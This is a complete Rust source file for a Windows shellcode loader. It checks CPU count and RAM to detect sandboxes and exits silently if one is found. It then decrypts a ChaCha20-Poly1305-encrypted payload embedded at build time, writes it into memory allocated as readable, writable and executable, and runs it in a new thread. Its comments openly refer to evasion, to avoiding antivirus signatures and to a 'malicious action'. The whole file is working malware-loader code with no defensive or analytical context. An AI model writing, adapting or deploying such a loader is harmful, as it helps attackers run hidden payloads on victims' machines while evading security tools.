use chacha20poly1305::{ // For ChaCha20-Poly1305 encryption/decryption
    aead::{Aead, KeyInit}, // For Aead trait and KeyInit
    ChaCha20Poly1305, Key, Nonce, // Specific types
};
use std::process; // For process exit
use std::ptr; // For raw pointer operations
use sysinfo::{System, SystemExt}; // For system information (RAM check)
use base64::engine::Engine as _; // Engine for base64 encoding/decoding
use base64::engine::general_purpose::STANDARD;  // General purpose base64 engine
use windows_sys::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}; // For memory allocation and permissions - executable memory
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject, INFINITE}; // For thread creation and synchronization

// Include the encrypted payload and associated key/nonce
include!(concat!(env!("OUT_DIR"), "/payload_data.rs")); // build.rs generates this file because we need to keep the key/nonce secret

/// --- Phase 0: Evasion Constants ---
const MIN_CPUS: usize = 4; 
const MIN_RAM_BYTES: u64 = 4 * 1024 * 1024 * 1024; // 4 GB

fn run_evasion_checks() -> bool {
    // 1. CPU Core Check
    // We strictly avoid using 'eprintln' or 'println' here to ensure no debug strings 
    // are compiled into the final binary, which could act as signatures.
    let available_cpus = num_cpus::get(); // Get the number of logical CPUs
    if available_cpus < MIN_CPUS { // If fewer than minimum required CPUs
        return false;
    }
    // 2. RAM Check
    let mut sys = System::new_all(); // Initialize system information
    sys.refresh_memory(); // Refresh memory info
    let total_memory = sys.total_memory(); // Get total memory in bytes

    if total_memory < MIN_RAM_BYTES { // If less than minimum required RAM
        return false;
    }
    true
}
fn main() {
    // --- Phase 0: Evasion ---
    // This check must occur before any malicious action.
    if !run_evasion_checks() {
        // If a sandbox is detected, exit immediately and silently.
        process::exit(0); 
    }
    
    // --- Phase 1: Decryption ---
    // 1. Base64 Decoding
    // Decode the ciphertext string generated by the build script.
    let ciphertext_vec = match STANDARD.decode(ENCRYPTED_PAYLOAD_BASE64) { // Decode the ciphertext in base64
        Ok(data) => data, // On success, get the byte vector
        Err(_) => process::exit(1), // Silent exit on error
    };
    
    // 2. ChaCha20 Setup
    // Initialize the cipher using the unique key and nonce from the build script.
    let key = Key::from_slice(&PAYLOAD_KEY); // load the key from the build script
    let nonce = Nonce::from_slice(&PAYLOAD_NONCE); // load the nonce from the build script
    let cipher = ChaCha20Poly1305::new(key); // Create the cipher instance for decryption

    // 3. Decryption
    // Decrypt the actual shellcode.
    let decrypted_payload = match cipher.decrypt(nonce, ciphertext_vec.as_ref()) { // Decrypt the ciphertext for shellcode 
        Ok(data) => data, // On success, get the decrypted byte vector for shellcode
        Err(_) => process::exit(1), // Silent exit on error
    };

    // --- Phase 2: Simple Execution ---    
    unsafe { // Unsafe block for raw pointer and FFI calls - FFI stands for Foreign Function Interface
        // 1. Allocate Memory
        // We request executable memory from the Windows OS.
        let base_addr = VirtualAlloc( // Request memory allocation
            ptr::null_mut(),            // Let Windows decide the address
            decrypted_payload.len(),    // Size of the payload
            MEM_COMMIT | MEM_RESERVE,   // Commit the memory immediately
            PAGE_EXECUTE_READWRITE      // CRITICAL: Permission to Read, Write, AND Execute
        );

        if base_addr.is_null() { // If allocation failed
            // If allocation fails (e.g., OOM), exit silently.
            process::exit(1); // Silent exit on error
        }

        // 2. Copy Shellcode
        // Copy the decrypted bytes into the newly allocated executable memory region.
        ptr::copy_nonoverlapping( // Copy the shellcode into allocated memory
            decrypted_payload.as_ptr(), // Source: decrypted shellcode
            base_addr as *mut u8, // Destination: allocated memory
            decrypted_payload.len() // Number of bytes to copy
        );

        // 3. Create Thread
        // Instruct Windows to spawn a new thread starting at the memory address of our shellcode.
        let thread_handle = CreateThread( // Create a new thread to run the shellcode
            ptr::null(),             // Default security attributes
            0,                       // Default stack size
            Some(std::mem::transmute(base_addr)), // Entry point (our shellcode)
            ptr::null(),             // No parameters
            0,                       // Start immediately
            ptr::null_mut()          // We don't need the Thread ID
        );

        if thread_handle == 0 { // If thread creation failed
            process::exit(1); // Silent exit on error
        }

        // 4. Wait for Completion
        // We must wait for the shellcode thread to finish (or run indefinitely).
        // Otherwise, the main process would exit, killing the shellcode thread.
        WaitForSingleObject(thread_handle, INFINITE);
    }
}